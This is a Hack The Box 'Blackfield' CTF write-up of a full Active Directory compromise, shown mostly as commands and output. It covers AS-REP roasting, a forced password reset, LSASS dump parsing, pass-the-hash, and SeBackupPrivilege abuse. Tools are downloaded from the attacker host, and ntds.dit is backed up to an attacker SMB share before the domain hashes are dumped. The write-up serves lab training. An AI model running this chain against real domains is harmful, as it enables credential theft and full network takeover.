# HTB: Blackfield — Writeup

**Target IP:** 10.129.49.209
**Attacker (Kali) IP:** 10.10.15.146

> Note: The machine was reset once mid-engagement, which changed the assigned lab IP. All commands below have been normalized to the **original IP (10.129.49.209)** used for the bulk of the engagement, for consistency.

---

## 1. Reconnaissance

### 1.1 Port Scanning (RustScan)

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# rustscan -a 10.129.49.209                          
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.49.209:53
Open 10.129.49.209:88
Open 10.129.49.209:135
Open 10.129.49.209:389
Open 10.129.49.209:445
Open 10.129.49.209:593
Open 10.129.49.209:3268
Open 10.129.49.209:5985
```

*(Ignoring RustScan's ulimit/config warnings — cosmetic, no functional impact.)*

### 1.2 Service/Version Scan (Nmap)

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# nmap -A -p53,88,135,389,445,593,3268,5985 10.129.49.209 -oA nmap/nmap
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 11:00 +0000
Nmap scan report for 10.129.49.209
Host is up (0.35s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 21:18:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-30T21:18:39
|_  start_date: N/A
|_clock-skew: 10h17m38s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   320.58 ms 10.10.14.1
2   321.04 ms 10.129.49.209

Nmap done: 1 IP address (1 host up) scanned in 96.53 seconds
```

Classic Active Directory Domain Controller footprint: **DNS, Kerberos, RPC, LDAP, SMB, Global Catalog, WinRM**. Hostname **DC01**, domain **BLACKFIELD.local**. (The ~10h clock skew is a lab artifact, not a finding.)

---

## 2. Anonymous / Guest SMB Enumeration

### 2.1 Guest Access Confirmed

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# nxc smb 10.129.49.209 -u 'Guest' -p '' --shares   
SMB         10.129.49.209   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.49.209   445    DC01             [+] BLACKFIELD.local\Guest: 
SMB         10.129.49.209   445    DC01             [*] Enumerated shares
SMB         10.129.49.209   445    DC01             Share           Permissions     Remark
SMB         10.129.49.209   445    DC01             -----           -----------     ------
SMB         10.129.49.209   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.49.209   445    DC01             C$                              Default share
SMB         10.129.49.209   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.49.209   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.49.209   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.49.209   445    DC01             profiles$       READ            
SMB         10.129.49.209   445    DC01             SYSVOL                          Logon server share 
```

The **Guest** account is enabled and can list shares. Two stand out: **`profiles$`** (readable) and **`forensic`** (not yet accessible).

### 2.2 Harvesting Usernames from `profiles$`

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# smbclient //10.129.49.209/profiles$ -U anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 16:47:12 2020
  ..                                  D        0  Wed Jun  3 16:47:12 2020
  AAlleni                             D        0  Wed Jun  3 16:47:11 2020
  ABarteski                           D        0  Wed Jun  3 16:47:11 2020
  ABekesz                             D        0  Wed Jun  3 16:47:11 2020
.....
<snip — ~300 directory entries, one per user profile name (AAlleni, ABarteski, ... through
ZWausik), all timestamped Wed Jun 3 2020, plus a lone "audit2020" entry. Saved verbatim to
a local file as a username source list for the next step.>
.....
  ZWausik                             D        0  Wed Jun  3 16:47:12 2020

                5102079 blocks of size 4096. 1692748 blocks available
smb: \> 
```

Each subdirectory name under `profiles$` is effectively a valid Windows username (roaming profile folders) — a goldmine for building a username list.

### 2.3 Building the Username List

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# cat words | awk '{print $1}' > users.txt
```

---

## 3. Username Validation (Kerbrute) & AS-REP Roasting

### 3.1 Kerbrute User Enumeration

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# kerbrute userenum -d BLACKFIELD.local --dc DC01.BLACKFIELD.local users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/30/26 - Ronnie Flathers @ropnop

2026/07/30 12:01:18 >  Using KDC(s):
2026/07/30 12:01:18 >   DC01.BLACKFIELD.local:88

2026/07/30 12:01:40 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2026/07/30 12:03:44 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2026/07/30 12:03:49 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2026/07/30 12:04:17 >  Done! Tested 314 usernames (3 valid) in 179.724 seconds
```

Only **3 valid usernames** out of ~314 candidates: `audit2020`, `support`, `svc_backup` (the rest of the `profiles$` folder names were decoys/red herrings, not real AD accounts).

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# cat users.txt | awk '{print $7}' > priv_esc.txt
```

### 3.2 ASREPRoasting

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# GetNPUsers.py -dc-ip 10.129.49.209 -usersfile priv_esc.txt BLACKFIELD.local/
Impacket v0.14.0.dev0+20260508.120809.46e9b038 - Copyright Fortra, LLC and its affiliated companies 

[-] User audit2020@BLACKFIELD.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.local@BLACKFIELD.LOCAL:112b8ca903a05f9d3a4a43969e716dc8$aa06ba179f20e803012332d3a8ba88b8884495f123fbcdbd85eb05c32f23bb820d37a6f6179134788c6a77288233638e0d63ae4e8a78fa11d8932fbd1e376b26af1055a6e1a25d99ef77b12f1ebf3b6c7e429604cb50a008377659be73c4dcde2a469beeb9b4f7dd71589944b8f5c5be10d69dfdde6a48a10be4b1c760d7b54f65f266f3ff8a14c4222914c752cb59c0afc6bec63b7904463f61d7ffc9b09723a8a1970010257acd68ccdb0536d1de132bde88bb6ac94b6ee0871e49c0cbcfd6e2909036210f3cb8bfe3c90c18a731ab42eff399da2184913952ed502214b96c89a82b363dbb74017f2ccf6a4fa426c9b998b708
[-] User svc_backup@BLACKFIELD.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Only **`support`** has `UF_DONT_REQUIRE_PREAUTH` set → an AS-REP hash was retrievable.

### 3.3 Cracking the AS-REP Hash (John)

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash                     
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.local@BLACKFIELD.LOCAL)     
1g 0:00:00:32 DONE (2026-07-30 13:59) 0.03061g/s 438915p/s 438915c/s 438915C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**Cracked: `support` / `#00^BlackKnight`**

---

## 4. BloodHound → ForceChangePassword Abuse

### 4.1 Collecting AD Data

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# bloodhound-python \
-d BLACKFIELD.local \
-u support \
-p '#00^BlackKnight' \     
-ns 10.129.49.209 \ 
-c all \
--zip \
--dns-timeout 30 \
--dns-tcp   
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
.....
<snip — per-computer enumeration queries against the 18 domain computers; most failed
with Kerberos clock-skew / connection-timeout warnings (DC01 was the only host actually
reachable and relevant), none of which changed the outcome>
.....
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 01M 40S
INFO: Compressing output into 20260730141612_bloodhound.zip
```

### 4.2 Identifying the Abusable Edge

Reviewing "Outbound Object Control" for **support** in BloodHound revealed a **`ForceChangePassword`** edge onto the user **`audit2020`** — meaning `support` can reset `audit2020`'s password without knowing the current one.

### 4.3 Abusing ForceChangePassword (bloodyAD)

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# bloodyad --host 10.129.49.209 -d BLACKFIELD.local -u support -p '#00^BlackKnight' set password audit2020 'Newp@ss123'
[+] Password changed successfully!
```

**New credential: `audit2020` / `Newp@ss123`**

---

## 5. Accessing the `forensic` Share → Memory Dump Loot

### 5.1 Share Access Widens

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# nxc smb 10.129.49.209 -u 'audit2020' -p 'Newp@ss123' --shares
SMB         10.129.49.209   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.49.209   445    DC01             [+] BLACKFIELD.local\audit2020:Newp@ss123 
SMB         10.129.49.209   445    DC01             [*] Enumerated shares
SMB         10.129.49.209   445    DC01             Share           Permissions     Remark
SMB         10.129.49.209   445    DC01             -----           -----------     ------
SMB         10.129.49.209   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.49.209   445    DC01             C$                              Default share
SMB         10.129.49.209   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.49.209   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.49.209   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.49.209   445    DC01             profiles$       READ            
SMB         10.129.49.209   445    DC01             SYSVOL          READ            Logon server share 
```

`audit2020` now has **READ** on `forensic`.

### 5.2 Browsing the Forensic Share

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# smbclient //10.129.49.209/forensic -U audit2020
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 13:03:16 2020
  ..                                  D        0  Sun Feb 23 13:03:16 2020
  commands_output                     D        0  Sun Feb 23 18:14:37 2020
  memory_analysis                     D        0  Thu May 28 20:28:33 2020
  tools                               D        0  Sun Feb 23 13:39:08 2020

                5102079 blocks of size 4096. 1687450 blocks available
smb: \> cd memory_analysis
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 20:28:33 2020
  ..                                  D        0  Thu May 28 20:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 20:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 20:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 20:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 20:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 20:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 20:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 20:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 20:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 20:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 20:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 20:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 20:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 20:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 20:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 20:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 20:27:53 2020

                5102079 blocks of size 4096. 1687450 blocks available
```

A collection of process memory dumps — **`lsass.zip`** is the obvious target (LSASS holds credential material in memory).

### 5.3 Download Hiccup — smbclient Timeout

```
smb: \memory_analysis\> get lsass.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \memory_analysis\> getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip The connection is disconnected now: NT_STATUS_CONNECTION_DISCONNECTED
```

`smbclient`'s parallel-read download choked on the large file. Switched tools.

### 5.4 Successful Download via impacket-smbclient

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# impacket-smbclient audit2020@10.129.49.209
Impacket v0.14.0.dev0+20260508.120809.46e9b038 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use forensic
# cd memory_analysis
# ls
drw-rw-rw-          0  Thu May 28 20:29:24 2020 .
drw-rw-rw-          0  Thu May 28 20:29:24 2020 ..
-rw-rw-rw-   37876530  Thu May 28 20:29:24 2020 conhost.zip
-rw-rw-rw-   24962333  Thu May 28 20:29:24 2020 ctfmon.zip
-rw-rw-rw-   23993305  Thu May 28 20:29:24 2020 dfsrs.zip
-rw-rw-rw-   18366396  Thu May 28 20:29:24 2020 dllhost.zip
-rw-rw-rw-    8810157  Thu May 28 20:29:24 2020 ismserv.zip
-rw-rw-rw-   41936098  Thu May 28 20:29:24 2020 lsass.zip
-rw-rw-rw-   64288607  Thu May 28 20:29:24 2020 mmc.zip
-rw-rw-rw-   13332174  Thu May 28 20:29:24 2020 RuntimeBroker.zip
-rw-rw-rw-  131983313  Thu May 28 20:29:24 2020 ServerManager.zip
-rw-rw-rw-   33141744  Thu May 28 20:29:24 2020 sihost.zip
-rw-rw-rw-   33756344  Thu May 28 20:29:24 2020 smartscreen.zip
-rw-rw-rw-   14408833  Thu May 28 20:29:24 2020 svchost.zip
-rw-rw-rw-   34631412  Thu May 28 20:29:24 2020 taskhostw.zip
-rw-rw-rw-   14255089  Thu May 28 20:29:24 2020 winlogon.zip
-rw-rw-rw-    4067425  Thu May 28 20:29:24 2020 wlms.zip
-rw-rw-rw-   18303252  Thu May 28 20:29:24 2020 WmiPrvSE.zip
# get lsass.zip
# exit
```

### 5.5 Extracting Credentials with Pypykatz

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes 
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users
INFO:pypykatz:Parsing file lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
                                                                                                                                                    
┌──(root㉿kali)-[/home/kali/blackfield]
└─# cat hashes                                                                       
7f1e4ff8c6a8e6b6fcae2d9c0572cd62
9658d1d1dcd9250115e2205d9f48400d
b624dc83a27cc29da11d9bf25efea796
                                                                                                                                                    
┌──(root㉿kali)-[/home/kali/blackfield]
└─# cat users                                      

Administrator
dc01$
DC01$
svc_backup
```

Three NTLM hashes recovered, tied to `Administrator`, `dc01$`/`DC01$`, and `svc_backup`.

---

## 6. Credential Spray → Foothold as svc_backup → user.txt

### 6.1 Hash Spray (NetExec)

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# nxc smb 10.129.49.209 -u users -H hashes --continue-on-success
SMB         10.129.49.209   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.49.209   445    DC01             [+] BLACKFIELD.local\:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 
SMB         10.129.49.209   445    DC01             [-] BLACKFIELD.local\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
.....
<snip — remaining failed combinations of Administrator/dc01$/DC01$ against all three
hashes, all STATUS_LOGON_FAILURE, until the one working pair below>
.....
SMB         10.129.49.209   445    DC01             [-] BLACKFIELD.local\svc_backup:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.129.49.209   445    DC01             [-] BLACKFIELD.local\Administrator:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.129.49.209   445    DC01             [-] BLACKFIELD.local\dc01$:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.129.49.209   445    DC01             [-] BLACKFIELD.local\DC01$:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.129.49.209   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
SMB         10.129.49.209   445    DC01             [-] BLACKFIELD.local\Administrator:b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
SMB         10.129.49.209   445    DC01             [-] BLACKFIELD.local\dc01$:b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
SMB         10.129.49.209   445    DC01             [-] BLACKFIELD.local\DC01$:b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
```

**Working: `svc_backup` : `9658d1d1dcd9250115e2205d9f48400d` (NTLM hash, pass-the-hash)**

### 6.2 WinRM Login as svc_backup

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# evil-winrm -i 10.129.49.209 \                                                       
  -u svc_backup \                                                                        
  -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_backup> cd Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt
```

**User flag obtained** — logged in as **svc_backup** via pass-the-hash over WinRM.

---

## 7. Privilege Escalation — Abusing SeBackupPrivilege → ntds.dit Extraction

### 7.1 Checking Privileges

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**`SeBackupPrivilege`** (and `SeRestorePrivilege`) are enabled — this lets the account bypass normal file ACLs for backup/restore operations, which can be abused to read protected files like `ntds.dit` (the AD database) directly.

### 7.2 Staging SeBackupPrivilege Tooling

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Invoke-WebRequest -Uri http://10.10.15.146/SeBackupPrivilegeCmdLets.dll -OutFile SeBackupPrivilegeCmdLets.dll -UseBasicParsing
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Invoke-WebRequest -Uri http://10.10.15.146/SeBackupPrivilegeUtils.dll -OutFile SeBackupPrivilegeUtils.dll -UseBasicParsing
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### 7.3 Direct Copy Attempt — Blocked (File Locked)

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege c:\windows\ntds\ntds.dit c:\Users\svc_backup\Documents\ntds.dit -Overwrite 
Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)
```

`ntds.dit` is locked by the running `NTDS` service, so a direct privileged copy fails. Pivoted to using **`wbadmin`** (Windows Server Backup) instead, which can snapshot the volume via VSS and pull the file out that way.

### 7.4 Setting Up an SMB Listener & Running wbadmin Backup

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use k: \\10.10.15.146\smb /user:smbuser smbpass
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start backup -backuptarget:\\10.10.15.146\smb -include:c:\windows\ntds -quiet
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Note: The backed up data cannot be securely protected at this destination. ...
Retrieving volume information...
This will back up (C:) (Selected Files) to \\10.10.15.146\smb.
The backup operation to \\10.10.15.146\smb is starting.
Creating a shadow copy of the volumes specified for backup...
.....
<snip — repeated "Scanning the file system... Found (12) files." status lines during
the VSS shadow-copy scan, purely progress chatter>
.....
Creating a backup of volume (C:), copied (100%).
Summary of the backup operation:
------------------
The backup operation successfully completed.
The backup of volume (C:) completed successfully.
Log of files successfully backed up:
C:\Windows\Logs\WindowsServerBackup\Backup-31-07-2026_13-04-36.log
```

A Windows Server Backup job was pointed at a remote SMB share (an attacker-controlled listener), backing up `c:\windows\ntds` — this creates a VSS-based snapshot copy of `ntds.dit` that bypasses the file lock.

### 7.5 Listing & Recovering the Backup Version

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin get versions
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Backup time: 9/21/2020 4:00 PM
Backup location: Network Share labeled \\10.10.14.4\blackfieldA
Version identifier: 09/21/2020-23:00
Can recover: Volume(s), File(s)

Backup time: 7/31/2026 6:04 AM
Backup location: Network Share labeled \\10.10.15.146\smb
Version identifier: 07/31/2026-13:04
Can recover: Volume(s), File(s)
```

*(The 2020 backup entry is a stale historical artifact on the box — not one we created.)*

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start recovery -version:07/31/2026-13:04 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\Users\svc_backup\Documents -notrestoreacl -quiet
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file(s) c:\windows\ntds\ntds.dit from the
backup created on 7/31/2026 6:04 AM to c:\Users\svc_backup\Documents.
Preparing to recover files...

Running the recovery operation for c:\windows\ntds\ntds.dit, copied (1%).
Currently recovering c:\windows\ntds\ntds.dit.
Running the recovery operation for c:\windows\ntds\ntds.dit, copied (44%).
Running the recovery operation for c:\windows\ntds\ntds.dit, copied (84%).
Successfully recovered c:\windows\ntds\ntds.dit to c:\Users\svc_backup\Documents\.
The recovery operation completed.
Summary of the recovery operation:
--------------------
Recovery of c:\windows\ntds\ntds.dit to c:\Users\svc_backup\Documents\ successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0
```

`ntds.dit` recovered from the shadow-copy backup, unlocked, into a readable location.

### 7.6 Grabbing the SYSTEM Hive & Downloading Both Files

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM c:\Users\svc_backup\Documents\SYSTEM
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> dir


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/31/2026   6:04 AM       18874368 ntds.dit
-a----        7/31/2026   5:59 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----        7/31/2026   5:59 AM          16384 SeBackupPrivilegeUtils.dll
-a----        7/31/2026   6:20 AM       17391616 SYSTEM


*Evil-WinRM* PS C:\Users\svc_backup\Documents> download ntds.dit
Info: Downloading C:\Users\svc_backup\Documents\ntds.dit to ntds.dit
Info: Download successful!
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download SYSTEM
Info: Downloading C:\Users\svc_backup\Documents\SYSTEM to SYSTEM
Info: Download successful!
```

The `SYSTEM` registry hive is needed alongside `ntds.dit` to derive the boot key and decrypt the stored password hashes offline.

### 7.7 Offline Hash Extraction (impacket-secretsdump)

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.14.0.dev0+20260508.120809.46e9b038 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:753b67cd7e3a3a6e1a93cc7e61195af9:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
.....
<snip — several hundred decoy "BLACKFIELDxxxxxx" machine/user-shaped accounts, all sharing
the identical placeholder NTLM hash a658dd0c98e7ac3f46cca81ed6762d1c (i.e. non-functional
noise accounts baked into the box), plus the corresponding Kerberos key section
(aes256/aes128/des-cbc-md5 triplets per account) for the same set of accounts, svc_backup,
lydericlefebvre, and the machine accounts PC01$-PC13$/SRV-WEB$/SRV-FILE$/SRV-EXCHANGE$/
SRV-INTRANET$ — none of which were needed for the privesc path>
.....
svc_backup:aes256-cts-hmac-sha1-96:20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
BLACKFIELD.local\lydericlefebvre:aes256-cts-hmac-sha1-96:82e6a43bb06f136b82894d444d6d877247bc2c7739661474c8a6de61779f7446
[*] Cleaning up... 
```

**Full NTDS dump obtained — including the `Administrator` NTLM hash: `184fb5e5178480be64824d4cd53b99ee`.**

---

## 8. Full Domain Compromise — Pass-the-Hash as Administrator

### 8.1 WinRM as Administrator

```
┌──(root㉿kali)-[/home/kali/blackfield]
└─# evil-winrm -i 10.129.49.209 \             
  -u Administrator \
  -H 184fb5e5178480be64824d4cd53b99ee                                       
                                        
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt
```

**Root/Administrator obtained** via pass-the-hash using the NTLM hash extracted from the offline NTDS dump. `root.txt` confirmed present in `C:\Users\Administrator\Desktop`.

---

## 9. Summary / Attack Chain

1. **Recon**: Nmap → classic AD Domain Controller (DNS, Kerberos, RPC, LDAP, SMB, GC, WinRM) — domain **BLACKFIELD.local**, host **DC01**.
2. **Anonymous/Guest SMB**: Guest access enabled → enumerated shares → `profiles$` share readable anonymously, its folder names harvested as a candidate username list.
3. **Username validation**: Kerbrute confirmed only 3 real accounts out of ~300+ candidates: `audit2020`, `support`, `svc_backup`.
4. **AS-REP Roasting**: `support` had Kerberos pre-auth disabled → dumped AS-REP hash → cracked with John/rockyou → `support:#00^BlackKnight`.
5. **BloodHound**: Collected AD data as `support` → found a **ForceChangePassword** edge onto `audit2020`.
6. **Password reset abuse**: Used **bloodyAD** to reset `audit2020`'s password without knowing the old one.
7. **Forensic share access**: `audit2020` now had read access to the `forensic` share containing multiple process memory dumps, including `lsass.zip`.
8. **Credential extraction**: Downloaded `lsass.zip` (via impacket-smbclient after smbclient's parallel-read choked on the large file) → ran **Pypykatz** against the LSASS minidump → recovered NTLM hashes for `Administrator`, `DC01$`, and `svc_backup`.
9. **Pass-the-hash spray**: Sprayed the three hashes across the three usernames with NetExec → only `svc_backup`'s hash worked → WinRM/pass-the-hash login as **svc_backup** → `user.txt`.
